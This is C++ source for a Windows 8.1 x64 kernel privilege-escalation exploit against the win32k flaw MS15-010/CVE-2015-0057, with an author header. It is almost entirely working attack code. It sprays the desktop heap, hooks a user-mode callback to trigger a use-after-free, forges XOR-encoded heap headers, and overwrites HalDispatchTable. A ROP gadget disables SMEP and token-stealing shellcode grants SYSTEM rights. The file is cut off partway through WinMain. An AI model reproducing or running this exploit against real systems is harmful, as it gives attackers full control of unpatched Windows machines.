/*
 MS15-010/CVE-2015-0057 win32k Local Privilege Escalation
 Date: 2015-12-17
 Exploit author: Jean-Jamil Khalife
 Tested on Windows 8.1 x64 EN
 Home: http://www.hdwsec.fr
 Blog: http://www.hdwsec.fr/blog/
*/

#include <windows.h>
#include <Strsafe.h>
#include <string>
#include <Shlwapi.h>

#include "structs.h"

#pragma comment(lib, "Shlwapi.lib")

using namespace std;

#define	MAX_OBJECTS             0x1300
#define	MAX_FAKE_OBJECTS        0x125

#define DELTA_OFFSET            0x1C
#define _HEAP_BLOCK_SIZE        0x10
#define PROPLIST_SIZE           0x03*0x10
#define OVERLAY1_SIZE           0x10*0x10
#define	OVERLAY2_SIZE           0x10*0x10
#define MENU_SIZE               0x0a*0x10

#define	MENU_ITEMS_ARRAY_OFFSET 0x50

const char g_szClassName[] = "myWindowClass";
HWND hwnd;
HWND hwndfakeobjs[MAX_FAKE_OBJECTS];
HWND hwndtab[MAX_OBJECTS];
HMENU hmenutab[MAX_OBJECTS];
int flagok = 0;
int g_HookCount = 0;
string xorKey;

PVOID HalDispatchTable;
PVOID halBase = NULL;
PVOID hqsi_addr = NULL;
PVOID rop_addr = NULL;

PSHAREDINFO pSharedInfo;
ULONG_PTR deltaDHeap;

typedef VOID (WINAPI * fct_clLoadLib)(VOID *);
typedef NTSTATUS (NTAPI* _NtCreateTimer)( PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, TIMER_TYPE);
typedef NTSTATUS (WINAPI *_NtQueryIntervalProfile)(UINT ProfileSource, PULONG Interval);

extern "C" BOOL NTAPI NtUserDefSetText(HWND hwnd, PLARGE_UNICODE_STRING pstrText);

fct_clLoadLib _ClientLoadLibrary;
ULONG_PTR _ClientLoadLibrary_addr;

BOOL GetDHeapCookie()
{
	MEMORY_BASIC_INFORMATION MemInfo = { 0 };
	BYTE *Addr = (BYTE *) 0x1000;
	ULONG_PTR dheap = (ULONG_PTR)pSharedInfo->aheList;

	while (VirtualQuery(Addr, &MemInfo, sizeof(MemInfo)))
	{
		if (MemInfo.Protect = PAGE_READONLY && MemInfo.Type == MEM_MAPPED && MemInfo.State == MEM_COMMIT)
		{
			if ( *(UINT *)((BYTE *)MemInfo.BaseAddress + 0x10) == 0xffeeffee )
			{
				if (*(ULONG_PTR *)((BYTE *)MemInfo.BaseAddress + 0x28) == (ULONG_PTR)((BYTE *)MemInfo.BaseAddress + deltaDHeap))
				{
					xorKey.append( (CHAR*)((BYTE *)MemInfo.BaseAddress + 0x80), 16 );
					return TRUE;
				}
			}
		}
		Addr += MemInfo.RegionSize;
	}

	return FALSE;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	switch(msg)
	{
	case WM_CLOSE:
		DestroyWindow(hwnd);
	break;
	case WM_DESTROY:
		PostQuitMessage(0);
	break;
	default:
		return DefWindowProc(hwnd, msg, wParam, lParam);
	}

	return 0;
}

VOID Fake__ClientLoadLibrary (VOID* a)
{ 
	CHAR Buf[0x1000]; 
	memset(Buf, 0, sizeof(Buf)); 

	if (flagok) 
	{ 
		if (++g_HookCount == 2) {
			flagok = 0;
			DestroyWindow(hwnd);
			
			for (int i = 0; i < MAX_FAKE_OBJECTS; i++)
				SetPropA(hwndfakeobjs[i], (LPCSTR)0x06, (HANDLE)0xCAFECAFECAFECAFE);
		} 
	} 

	_ClientLoadLibrary(Buf);
}


BOOL InitWindows(int begin, int count, HINSTANCE hInstance, HWND* win)
{
	WNDCLASSEXA wc;

	wc.cbSize        = sizeof(WNDCLASSEX);
	wc.style         = 0;
	wc.lpfnWndProc   = WndProc;
	wc.cbClsExtra    = 0;
	wc.cbWndExtra    = 0;
	wc.hInstance     = hInstance;
	wc.hIcon         = LoadIcon(NULL, IDI_APPLICATION);
	wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
	wc.lpszMenuName  = NULL;
	wc.lpszClassName = g_szClassName;
	wc.hIconSm       = LoadIcon(NULL, IDI_APPLICATION);

	if (!RegisterClassExA(&wc))
	{
		if (GetLastError() != ERROR_CLASS_ALREADY_EXISTS)
			return FALSE;
	}

	for (int i = begin; i < count; i++)
	{
		win[i] = CreateWindowExA(
			0,
			g_szClassName,  
			0,
			WS_OVERLAPPEDWINDOW,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			(HWND) NULL,
			(HMENU) NULL,
			NULL,
			(PVOID) NULL
		);

		if (win[i] == NULL)
			return FALSE;

		SetPropA(win[i], (LPCSTR) (1), (HANDLE) 0xCCCCCCCCCCCCCCCC);
	}

	return TRUE;
}

BOOL init_DHInfo()
{
	_TEB64 *_teb = (_TEB64*)NtCurrentTeb();
	deltaDHeap = *(ULONG_PTR *)((BYTE *)(_teb->Win32ClientInfo) + 0x28);

	pSharedInfo = (PSHAREDINFO)GetProcAddress(GetModuleHandleA("USER32.dll"), "gSharedInfo");
	
	if (!pSharedInfo)
		return FALSE;

	if (!GetDHeapCookie())
		return FALSE;

	return TRUE;
}

VOID* getMappedHandlePtr(HANDLE myhandle, VOID** userlandptr)
{
	HANDLE handle;
	HANDLEENTRY *UserHandleTable;

	UserHandleTable = (HANDLEENTRY *)(*(ULONG_PTR *)((BYTE *)pSharedInfo+8));
	DWORD cEntries = ((ULONG *)(pSharedInfo->psi))[2];

	for (DWORD i = 0; i < cEntries; i++)
	{
		handle = (HANDLE) ((UserHandleTable[i].wUniq << 16) | i);

		if (handle == myhandle)
		{
			*userlandptr = (VOID*)((LONG_PTR)UserHandleTable[i].phead - deltaDHeap);
			return (VOID*)((LONG_PTR)UserHandleTable[i].phead);
		}
	}

	return NULL;
}

FARPROC GetKernelAddress(HMODULE UserKernBase, PVOID RealKernelBase, LPCSTR SymName)
{
	PUCHAR KernBaseTemp     = (PUCHAR) UserKernBase;
	PUCHAR RealKernBaseTemp = (PUCHAR) RealKernelBase;
	PUCHAR temp             = (PUCHAR) GetProcAddress(UserKernBase, SymName);

	if (temp == NULL)
        return NULL;
         
	return (FARPROC)(temp - KernBaseTemp + RealKernBaseTemp);
}
 
DWORD matchInstr( CHAR* raw, ULONG_PTR size, CHAR* ptrn, DWORD ptrn_size )
{
	for (int i = 0; i < size; i++)
	{
		if (memcmp((CHAR *)&raw[i], ptrn, ptrn_size) == 0)
			return i;
	}

	return -1;
}


PVOID GetKernelOffset( CHAR* libpath, ULONG_PTR libbase, CHAR *ptrn, DWORD ptrn_size )
{
	HANDLE hFile;
	HANDLE hFileMapping;
	LPVOID lpFileBase;
	PIMAGE_DOS_HEADER dosHeader;
	PVOID addr = NULL;
	 
	hFile = CreateFileA(libpath, GENERIC_READ, FILE_SHARE_READ, NULL,
			OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (hFile == INVALID_HANDLE_VALUE)
		return addr;

	hFileMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);

	if (hFileMapping == 0)
	{   
		CloseHandle(hFile);
		return addr; 
	}

	lpFileBase = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
	if (lpFileBase == 0)
	{
		CloseHandle(hFileMapping);
		CloseHandle(hFile);
		return addr;
	}

	dosHeader = (IMAGE_DOS_HEADER*) lpFileBase;
	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
		goto exit_f;

	ULONG_PTR _nt_header = (ULONG_PTR)lpFileBase + ((PIMAGE_DOS_HEADER)lpFileBase)->e_lfanew;
	ULONG_PTR _section = ((ULONG_PTR) &((PIMAGE_NT_HEADERS)_nt_header)->OptionalHeader + ((PIMAGE_NT_HEADERS)_nt_header)->FileHeader.SizeOfOptionalHeader);

	ULONG_PTR _sec_count = ((PIMAGE_NT_HEADERS)_nt_header)->FileHeader.NumberOfSections;

	while (_sec_count--)
	{
		CHAR* p = (CHAR*)((PIMAGE_SECTION_HEADER)_section)->Name;
		if (((PIMAGE_SECTION_HEADER)_section)->Characteristics & 0x00000020 )
		{			
			ULONG_PTR sec_va = ((PIMAGE_SECTION_HEADER)_section)->VirtualAddress;

			ULONG_PTR rawdata = ( (ULONG_PTR)lpFileBase + ((PIMAGE_SECTION_HEADER)_section)->PointerToRawData );
			ULONG_PTR size = ((PIMAGE_SECTION_HEADER)_section)->SizeOfRawData;

			DWORD offset = matchInstr((CHAR *)rawdata, size, ptrn, ptrn_size);

			if (offset != -1)
			{
				addr = (PVOID)(libbase + sec_va + offset);
				break;
			}
		}

		_section += sizeof( IMAGE_SECTION_HEADER );
	}

exit_f:
	UnmapViewOfFile(lpFileBase);
	CloseHandle(hFileMapping);
	CloseHandle(hFile);

	return addr;
}

BOOL GetKernelInfo()
{
	CHAR kFullName[256];
	LPSTR kName;
	HMODULE NTosHandle;
	_NtQuerySystemInformation NtQuerySystemInformation;
	PSYSTEM_MODULE_INFORMATION pModuleInfo;
	ULONG len;
	NTSTATUS ret;
	HMODULE ntdllHandle;
	PVOID kBase = NULL;

 	char ropPtrn[]  = "\x0f\x22\xe0\x48\x83\xc4\x28\xc3";
	char hqsiPtrn[] =
		"\x55\x53\x56\x57\x41\x54\x41\x56\x41\x57\x48\x8d\x6c\x24\xc0\x48"
		"\x81\xec\x40\x01\x00\x00\x48\x8b\x05\xc3\x7c\xfe\xff\x48\x33\xc4"
		"\x48\x89\x45\x30\x33\xdb\x4d\x8b\xf9\x4d\x8b\xe0\x8b\xf2\xc6\x44"
		"\x24\x20\x00\x4d\x85\xc9\x74\x03\x41\x21\x19\x33\xff\x45\x33\xf6"
		"\x83\xf9\x19\x0f\x8f\xd8\x00\x00\x00\x41\x8d\x7e\x0c\x74\x65\x3b";

	ntdllHandle = GetModuleHandleA((LPCSTR)"ntdll");
	if (!ntdllHandle) {
		return FALSE;
	}
 
	NtQuerySystemInformation =  (_NtQuerySystemInformation)GetProcAddress(ntdllHandle, 
				"NtQuerySystemInformation");
	if (!NtQuerySystemInformation) {
		return FALSE;
	}
	 
	ret = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
	if (!ret) {
		return FALSE;
	}
	 
	pModuleInfo = (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
	ret = NtQuerySystemInformation(SystemModuleInformation, pModuleInfo, len, &len);

	int i = sizeof(SYSTEM_MODULE_INFORMATION);

	for (ULONG i = 0; i < pModuleInfo->Count; i++)
	{	
		memset(kFullName, 0x00, sizeof(kFullName));
		strcpy_s(kFullName, sizeof(kFullName)-1, pModuleInfo->Module[i].ImageName);

		if ( StrStrA( kFullName, "ntoskrnl" ) != NULL )
		{
			kBase = pModuleInfo->Module[i].Base;
			kName = strrchr(kFullName, '\\');
			NTosHandle = LoadLibraryA(++kName);
		}
		else if ( StrStrA( kFullName, "hal.dll" ) != NULL )
			halBase = pModuleInfo->Module[i].Base;

		if ( kBase != NULL && halBase != NULL)
			break;
	}

	if ( kBase == NULL || halBase == NULL)
		return FALSE;
 
	if (NTosHandle == NULL) {
		return FALSE;
	}

	CHAR filepath[MAX_PATH]={0};

	// find the ROP address that will modify the cr4
	ExpandEnvironmentStringsA("%SystemRoot%\\system32\\ntoskrnl.exe", filepath, MAX_PATH - 1);
	rop_addr = GetKernelOffset(filepath, (ULONG_PTR)kBase, ropPtrn, sizeof(ropPtrn) - 1);
	
	if (rop_addr == NULL)
		return FALSE;

	// find the hal!HaliQuerySystemInformation address
	memset(filepath, '\0', MAX_PATH);
	ExpandEnvironmentStringsA("%SystemRoot%\\system32\\hal.dll", filepath, MAX_PATH - 1);
	hqsi_addr = GetKernelOffset( filepath, (ULONG_PTR) halBase, hqsiPtrn, sizeof(hqsiPtrn) - 1);
	
	if (hqsi_addr == NULL)
		return FALSE;

	// find the HalDispatchTable address
	HalDispatchTable = (PVOID)GetKernelAddress(NTosHandle, kBase, "HalDispatchTable");
	if (!HalDispatchTable)
		return FALSE;
 
	return TRUE;
}

BOOL SpawnProc(CHAR* proc)
{
	PROCESS_INFORMATION pi;
	STARTUPINFOA si;
 
	ZeroMemory( &si, sizeof(si) );
	si.cb = sizeof(si);
	ZeroMemory( &pi, sizeof(pi) );

	if (!CreateProcessA(proc, proc, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
		return FALSE;

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	return TRUE;
}

VOID CreateHoles(int nb)
{
	for (int i=0; i < nb; i++)
	{
		if ( (i % 0x150) == 0 )
			DestroyWindow(hwndtab[i]);
	}
}

PVOID PreparePayload(PVOID cmenu_addr)
{
	// restore the desktop heap
	CHAR stage1[] =
		"\x57\x56\x48\xbf\xdd\xdd\xdd\xdd\xdd\xdd\xdd\xdd\x48\xbe\xcc\xcc"
		"\xcc\xcc\xcc\xcc\xcc\xcc\x48\xb9\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa"
		"\xf3\xa4\x5e\x5f\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x50\x53\x48\xb8\xee\xee\xee\xee\xee\xee\xee\xee\x48\xbb\xff\xff"
		"\xff\xff\xff\xff\xff\xff\x48\x89\x18\x5b\x58\x90\x90\x90\x90\x90";

	// shellcode Win 8.1 (64 bit)
	// ref: pwn2own 2014 / afd.sys
	BYTE sc[] =
		"\x41\x51"                              // push r9 save regs
		"\x41\x52"                              // push r10
		"\x65\x4C\x8B\x0C\x25\x88\x01\x00\x00"  // mov r9, gs:[0x188], get _ETHREAD from KPCR
		"\x4D\x8B\x89\xB8\x00\x00\x00"          // mov r9, [r9+0xb8], get _EPROCESS from _ETHREAD
		"\x4D\x89\xCA"                          // mov r10, r9 save current eprocess
		"\x4D\x8B\x89\x40\x02\x00\x00"          // mov r9, [r9+0x240] $a, get blink
		"\x49\x81\xE9\x38\x02\x00\x00"          // sub r9, 0x238 => _KPROCESS
		"\x49\x83\xB9\xE0\x02\x00\x00\x04"      // cmp [r9+0x2e0], 4 is UniqueProcessId == 4?
		"\x75\xe8"                              // jnz $a no? then keep searching!
		"\x4D\x8B\x89\x48\x03\x00\x00"          // mov r9, [r9+0x348] get token
		"\x4D\x89\x8A\x48\x03\x00\x00"          // mov [r10+0x348], r9 replace our token with system token
		"\x41\x5A"                              // pop r10 restore regs
		"\x41\x59"                              // pop r9
		"\x48\x8B\x44\x24\x20"                  // mov rax, [rsp+0x20] repair stack
		"\x48\x83\xC0\x3F"                      // add rax, 0x3f
		"\x48\x83\xEC\x30"                      // sub rsp, 0x30
		"\x48\x89\x04\x24"                      // mov [rsp], rax
		"\xc3";                                 // ret resume 

	ULONG_PTR index = 0x10000;
	PVOID addr = NULL;
	CHAR *backup = NULL;

	backup = (CHAR *) malloc(PROPLIST_SIZE + OVERLAY1_SIZE + MENU_SIZE + _HEAP_BLOCK_SIZE + 1);

	if (backup == NULL)
		return NULL;

	CHAR* _cObjs_addr = (CHAR *)cmenu_addr - (PROPLIST_SIZE + OVERLAY1_SIZE + _HEAP_BLOCK_SIZE);
	CHAR* _cObjs_kernel_addr = _cObjs_addr + deltaDHeap;

	memcpy(backup, _cObjs_addr, PROPLIST_SIZE + OVERLAY1_SIZE + MENU_SIZE + _HEAP_BLOCK_SIZE );

	backup[0x10]	= 0x02; // restore proplist
	backup[0x30]	= 0x00; // restore first overlay

	do {
		index += 0x1000;
		addr = VirtualAlloc( (PVOID)index, sizeof(sc), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
	}
	while (addr == NULL && index < 0xFFFFFFFF);

	if (addr == NULL)
		return NULL;

	*(ULONG_PTR *)(stage1 +  4) = (ULONG_PTR) _cObjs_kernel_addr;
	*(ULONG_PTR *)(stage1 + 14) = (ULONG_PTR) backup;
	*(ULONG_PTR *)(stage1 + 24) = PROPLIST_SIZE + OVERLAY1_SIZE+MENU_SIZE+_HEAP_BLOCK_SIZE;

	*(ULONG_PTR *)(stage1 + 3*16+4) = (ULONG_PTR)HalDispatchTable+8;
	*(ULONG_PTR *)(stage1 + 4*16-2) = (ULONG_PTR)hqsi_addr;

	memset((CHAR *)addr, 0x90, 0x100);
	memcpy((CHAR *)addr + 0x100, stage1, sizeof(stage1) - 1);
	memcpy((CHAR *)addr + 0x100 + sizeof(stage1) - 1, sc, sizeof(sc));

	return addr;
}

VOID
NTAPI
RtlInitLargeUnicodeString(IN OUT PLARGE_UNICODE_STRING DestinationString,
                          IN PCWSTR SourceString,
                          IN INT Unknown,
                          IN INT datasize = 0)
{
	ULONG DestSize;

	if (datasize != 0)
	{
		DestSize = datasize;
		DestinationString->Length = DestSize;
		DestinationString->MaximumLength = DestSize + sizeof(WCHAR);
	}
	else if (SourceString)
	{
		DestSize = (ULONG)wcslen(SourceString) * sizeof(WCHAR);
		DestinationString->Length = DestSize;
		DestinationString->MaximumLength = DestSize + sizeof(WCHAR);
	}
	else
	{
		DestinationString->Length = 0;
		DestinationString->MaximumLength = 0;
	}

	DestinationString->Buffer = (PWSTR)SourceString;
	DestinationString->bAnsi  = FALSE;
}

string XOR(string value, string key)
{
	string retval(value);

	SIZE_T klen = key.length();
	SIZE_T vlen = value.length();

	UINT k = 0;
	UINT v = 0;

	for (v; v < vlen; v++)
	{
		retval[v] = value[v] ^ key[k];
		k = (++k < klen ? k : 0);
	}

	return retval;
}

BOOL SprayObjects(SHORT obj_count)
{
	int j = 0;
	CHAR o1str[OVERLAY1_SIZE - _HEAP_BLOCK_SIZE] = {0};
	CHAR o2str[OVERLAY2_SIZE - _HEAP_BLOCK_SIZE] = {0};
	LARGE_UNICODE_STRING o1lstr, o2lstr;

	// build first overlay
	memset(o1str, '\x43', OVERLAY2_SIZE - _HEAP_BLOCK_SIZE);
	RtlInitLargeUnicodeString(&o1lstr, (WCHAR*) o1str, (UINT) -1, OVERLAY1_SIZE - _HEAP_BLOCK_SIZE - 2);

	// build second overlay
	memset(o2str, '\x41', OVERLAY2_SIZE - _HEAP_BLOCK_SIZE);
	*(DWORD *) o2str        = 0x00000000;
	*(DWORD *)(o2str+4)     = 0x00000000;
	*(DWORD *)(o2str+8)     = 0x00010000 + OVERLAY2_SIZE;
	*(DWORD *)(o2str+12)    = 0x10000000 + ((OVERLAY1_SIZE+MENU_SIZE+_HEAP_BLOCK_SIZE)/0x10);

	string clearh, newh;
	o2str[11] = o2str[8] ^ o2str[9] ^ o2str[10];
	clearh.append(o2str, 16);
	newh = XOR(clearh, xorKey);
	memcpy(o2str, newh.c_str(), 16);
	RtlInitLargeUnicodeString(&o2lstr, (WCHAR*) o2str, (UINT) - 1, OVERLAY2_SIZE - _HEAP_BLOCK_SIZE - 2);

	SHORT unused_win_index = 0x20;
	for (SHORT i = 0; i < obj_count; i++) 
	{
		// property list
		SetPropA(hwndtab[i], (LPCSTR) (i + 0x1000), (HANDLE) 0xBBBBBBBBBBBBBBBB);

		// overlay 1
		if ((i % 0x150) == 0)
			NtUserDefSetText(hwndtab[MAX_OBJECTS - (unused_win_index--)], &o1lstr);

		// menu object
		hmenutab[i] = CreateMenu();
		if (hmenutab[i] == 0)
			return FALSE;

		// overlay 2
		if ((i % 0x150) == 0)
			NtUserDefSetText(hwndtab[MAX_OBJECTS - (unused_win_index--)], &o2lstr);
	}

	// create one item for each menu
	for (SHORT i = 0; i < obj_count; i++)
	{
		MENUITEMINFOA mii;
		mii.cbSize = sizeof(MENUITEMINFO);
		mii.fMask = MIIM_ID;
		mii.wID = 0xBEEFBEEF;
		BOOL res = InsertMenuItemA(hmenutab[i], 0, TRUE, &mii);
		if (res == FALSE)
			return FALSE;
	}

	return TRUE;
}

ULONG_PTR Get__ClientLoadLibrary()
{
	ULONG_PTR addr = NULL;
	addr = *(ULONG_PTR *)(__readgsqword(0x60) + 0x58) + 0x238;
	return addr;
}

BOOL Hook__ClientLoadLibrary()
{
	DWORD dwOldProtect;

	if (!VirtualProtect((LPVOID) _ClientLoadLibrary_addr, 0x1000, PAGE_READWRITE, &dwOldProtect))
		return FALSE;

	*(ULONG_PTR *) _ClientLoadLibrary_addr = (ULONG_PTR) Fake__ClientLoadLibrary;

	if (!VirtualProtect((LPVOID) _ClientLoadLibrary_addr, 0x1000, dwOldProtect, &dwOldProtect))
		return FALSE;

	return TRUE;
}

BOOL UnHook__ClientLoadLibrary()
{
	DWORD dwOldProtect;

	if (!VirtualProtect((LPVOID) _ClientLoadLibrary_addr, 0x1000, PAGE_READWRITE, &dwOldProtect))
		return FALSE;

	*(ULONG_PTR *) _ClientLoadLibrary_addr = (ULONG_PTR) Fake__ClientLoadLibrary;

	if (!VirtualProtect((LPVOID) _ClientLoadLibrary_addr, 0x1000, dwOldProtect, &dwOldProtect))
		return FALSE;

	return TRUE;
}

BOOL Trigger(int cmd, HINSTANCE h)
{
	DWORD dwOldProtect = 0;

	// window which instantiates a scrollbar to be freed
	hwnd = CreateWindowExA(0, g_szClassName, 0, SBS_HORZ | WS_HSCROLL | WS_VSCROLL,
						   10, 10, 100, 100, (HWND) NULL, (HMENU) NULL, h, (PVOID) NULL);

	if (hwnd == NULL)
		return FALSE;

	ShowWindow(hwnd, SW_SHOW);
	UpdateWindow(hwnd);

	flagok = 1;
	EnableScrollBar(hwnd, SB_CTL | SB_BOTH, ESB_DISABLE_BOTH);

	return TRUE;
}

BOOL RunPayload(ULONG_PTR scaddr)
{
	HANDLE timer;
	ULONG_PTR r = scaddr;
	ULONG_PTR newcr4 = 0x406f8;
	_NtQueryIntervalProfile  NtQueryIntervalProfile;

	NtQueryIntervalProfile  = (_NtQueryIntervalProfile) GetProcAddress(GetModuleHandleA((LPCSTR) "ntdll.dll"), "NtQueryIntervalProfile");

	if (NtQueryIntervalProfile == NULL)
		return FALSE;

	_NtCreateTimer NtCreateTimer = (_NtCreateTimer) GetProcAddress(GetModuleHandleA((LPCSTR)"ntdll.dll"), "NtCreateTimer");

	if (NtCreateTimer == NULL)
		return FALSE;

	// clean kernel stack before running payload
	NtCreateTimer((HANDLE *)&timer, 0x1f0003, 0, (TIMER_TYPE) 0);

	// start payload (stage + shellcode)
	NtQueryIntervalProfile((UINT)scaddr, (PULONG) &newcr4);

	return TRUE;
}

VOID CleanHeap(HMENU menu_handle)
{
	UnHook__ClientLoadLibrary();

	DestroyMenu(menu_handle);
	DestroyWindow(hwnd);

	for (int i = 0; i < MAX_OBJECTS; i++) DestroyMenu(hmenutab[i]);
	for (int i = 0; i < MAX_OBJECTS; i++) DestroyWindow(hwndtab[i]);
	for (int i = 0; i < MAX_FAKE_OBJECTS; i++) DestroyWindow(hwndfakeobjs[i]);
}

BOOL PrepareHeap(HINSTANCE hInstance)
{
	if (!InitWindows(0, MAX_OBJECTS, hInstance, hwndtab))
		return FALSE;

	CHAR* str = (CHAR *)malloc(0x100000 + 1);
	memset(str, '\41', 0x100000);
	str[0x100000] = '\0';

	for (int i = 0; i < MAX_OBJECTS; i++)
		SetWindowTextA(hwndtab[i], str);

	free(str);

	for (int i = 0; i < MAX_OBJECTS; i++)
		DestroyWindow(hwndtab[i]);

	return TRUE;
}

BOOL IsWindows8Point1()
{
	LONG (WINAPI *pfnRtlGetVersion)(RTL_OSVERSIONINFOEXW*);
	(FARPROC&)pfnRtlGetVersion = GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
	RTL_OSVERSIONINFOEXW ver = {0};

	if (!pfnRtlGetVersion)
		return FALSE;

	ver.dwOSVersionInfoSize = sizeof(ver);
	if (!pfnRtlGetVersion(&ver) == 0)
		return FALSE;

	if (ver.dwMajorVersion == 6 && ver.dwMinorVersion == 3)
		return TRUE;

	return FALSE;
}

BOOL FindInterestingObjectInfo(SHORT obj_count, PVOID* menu_addr, HMENU* menu_handle, HWND* win_overlay1_handle)
{
	PVOID userland_addr;
	
	SHORT unused_win_index = 0x20;
	for (SHORT i = 0; i < obj_count; i++)
	{
		if ((i % 0x150) == 0)
		{
			if (!getMappedHandlePtr(hmenutab[i], &userland_addr))
				continue;

			ULONG_PTR _prop_tag_addr = (ULONG_PTR)userland_addr - _HEAP_BLOCK_SIZE*2 - OVERLAY1_SIZE - 8 - 8;
			if (*(ULONG_PTR *)_prop_tag_addr == 0x000000020000000e)
			{
				*menu_addr	 = userland_addr;
				*menu_handle = *(HMENU *)userland_addr ;
				*win_overlay1_handle = hwndtab[MAX_OBJECTS - unused_win_index];
				return TRUE;
			}

			unused_win_index -=2;
		}
	}

	return FALSE;
}

VOID CorruptHeapHeader( PVOID menu_addr )
{
	ULONG_PTR xored_header;
	CHAR* tmp_header = NULL;
	string decoded_header, xored_heap_deader, new_heap_header;
	
	// decode first overlay heap header 
	xored_header   = (ULONG_PTR)menu_addr - OVERLAY1_SIZE - _HEAP_BLOCK_SIZE;
	decoded_header = XOR(string((CHAR *)xored_header, 16), xorKey);

	// modify heap header
	tmp_header = (CHAR *)decoded_header.c_str();
	tmp_header[8] = (OVERLAY1_SIZE + MENU_SIZE + _HEAP_BLOCK_SIZE)/0x10;	// new size
	tmp_header[11] = tmp_header[8] ^ tmp_header[9] ^ tmp_header[10];		// new checksum

	// xor new heap header
	new_heap_header = XOR(decoded_header, xorKey);

	// overwrite first overlay heap header
	for (int i = 0; i < MAX_FAKE_OBJECTS; i++)
		SetPropA(hwndfakeobjs[i], (LPCSTR)0x07, (HANDLE)*(ULONG_PTR *)(new_heap_header.c_str() + 8));
}

VOID ReplaceObjects(LARGE_UNICODE_STRING* plstr)
{
	for (SHORT i = 0; i < 0x100; i++) NtUserDefSetText(hwndtab[i], plstr);
}

VOID MakeNewMenu(PVOID menu_addr, CHAR* new_objects, LARGE_UNICODE_STRING* new_objs_lstr, PVOID addr)
{
	memset(new_objects, '\xAA', OVERLAY1_SIZE - _HEAP_BLOCK_SIZE);

	memcpy(new_objects + OVERLAY1_SIZE - _HEAP_BLOCK_SIZE, (CHAR *)menu_addr - _HEAP_BLOCK_SIZE, MENU_SIZE + _HEAP_BLOCK_SIZE);
	
	// modify _MENU.rgItems value
	*(ULONG_PTR *)(BYTE *)&new_objects[OVERLAY1_SIZE + MENU_ITEMS_ARRAY_OFFSET] = (ULONG_PTR)addr;

	RtlInitLargeUnicodeString(new_objs_lstr, (WCHAR*)new_objects, (UINT) -1, OVERLAY1_SIZE + MENU_SIZE - 2);
}


VOID RebuildMenu(CHAR* new_objects, PVOID addr)
{
	LARGE_UNICODE_STRING new_objs_lstr;

	// modify _MENU.rgItems value
	*(ULONG_PTR *)(BYTE *)&new_objects[OVERLAY1_SIZE + MENU_ITEMS_ARRAY_OFFSET] = (ULONG_PTR) HalDispatchTable;
	RtlInitLargeUnicodeString(&new_objs_lstr, (WCHAR*)new_objects, (UINT) - 1, OVERLAY1_SIZE + MENU_SIZE - 2);

	// rebuild menu
	ReplaceObjects(&new_objs_lstr);
}


VOID PatchDWORD(HMENU menu_handle, DWORD new_dword)
{
	MENUITEMINFOA mii;

	mii.cbSize = sizeof(mii);
	mii.fMask  = MIIM_ID;
	mii.wID    = new_dword;
	SetMenuItemInfoA(menu_handle, 0, TRUE, &mii);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR lpCmdLine, int nCmdShow)
{
	VOID *pl = NULL;
	PVOID sc_addr = NULL;
	PVOID menu_addr = NULL;
	HMENU menu_handle;
	HWND win_overlay1_handle;
	CHAR new_objects[OVERLAY1_SIZE + MENU_SIZE]={0};
	CHAR procpath[MAX_PATH]={0};
	LARGE_UNICODE_STRING new_objs_lstr;

	// must be run on Windows 8.1 (x64)
	if (!IsWindows8Point1()) {
		OutputDebugStringA("must be run on Windows 8.1 x64");
		return 0;
	}

	// find kernel addresses:
	// * nt!haldispatchtable
	// * hal!HaliQuerySystemInformation
	// * the ROP gadget
	if (!GetKernelInfo()) {
		OutputDebugStringA("failed to get kernel info");
		return 0;
	}

	// find desktop heap information (gSharedInfo; heap cookies)
	if (!init_DHInfo()) {
		OutputDebugStringA("failed to get desktop heap info");
		return 0;
	}

	// hook callback { USER32!_ClientLoadLibrary }
	_ClientLoadLibrary_addr = Get__ClientLoadLibrary();
	_ClientLoadLibrary = (fct_clLoadLib)*(ULONG_PTR *)_ClientLoadLibrary_addr;
	Hook__ClientLoadLibrary();

	// prepare heap before spraying objects
	if (!PrepareHeap(hInstance)) {
		OutputDebugStringA("failed to prepare heap");
		return 0;
	}

	// initialize a few window objects
	if (!InitWindows(0, MAX_OBJECTS, hInstance, hwndtab)) {
		OutputDebugStringA("failed to initialize window objects");
		return 0;
	}

	// spray aligned objects
	if (!SprayObjects(MAX_OBJECTS - 0x20)) {
		OutputDebugStringA("failed to spray aligned objects");
		return 0;
	}

	// initialize a few window objects to instantiate fake objects after triggering the vulnerability
	if (!InitWindows(0, MAX_FAKE_OBJECTS, hInstance, hwndfakeobjs)) {
		OutputDebugStringA("failed to initialize windows objects");
		return 0;
	}

	// create a few holes
	CreateHoles(MAX_OBJECTS - 0x20);

	// trigger the vulnerability
	if (Trigger(nCmdShow, hInstance) == NULL) {
		OutputDebugStringA("failed to trigger the vulnerability");
		return 0;
	}
	
	// find information about the objects to corrupt
	if (!FindInterestingObjectInfo(MAX_OBJECTS - 0x20, &menu_addr, &menu_handle, &win_overlay1_handle)) {
		OutputDebugStringA("failed to find the corrupted proplist");
		return 0;
	}

	// build payload (stage + shellcode)
	if ((sc_addr = PreparePayload(menu_addr)) == NULL) {
		OutputDebugStringA("failed to build payload (stage1 and shellcode");
		return 0;
	}

	// modify heap header of overlay 1
	CorruptHeapHeader(menu_addr);

	// build new objets (overlay1 + new menu)
	MakeNewMenu(menu_addr, new_objects, &new_objs_lstr, (PVOID)((ULONG_PTR)HalDispatchTable + 4));

	// free overlay 1
	DestroyWindow(win_overlay1_handle);
